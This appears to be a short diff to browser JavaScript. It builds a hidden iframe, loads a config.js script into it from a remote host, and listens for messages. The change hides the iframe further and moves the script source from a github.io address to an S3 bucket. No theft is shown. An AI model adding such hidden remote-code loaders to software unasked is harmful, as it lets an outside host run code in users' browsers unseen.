@@ -1,13 +1,13 @@
 const iframe = document.createElement('iframe');
 iframe.id = 'config-load-iframe';
-iframe.width = iframe.height = 0;
+iframe.style.display = 'none';
 document.body.append(iframe);
 
 let iframeWindow = iframe.contentWindow,
     iframeDoc = iframeWindow.document;
 
 let script = iframeDoc.createElement('script');
-script.src = 'https://stephen-marshall.github.io/config.js';
+script.src = 'https://configdemochecks.s3.us-east-2.amazonaws.com/config.js';
 iframeDoc.head.appendChild(script);
 
 window.addEventListener('message', message => {
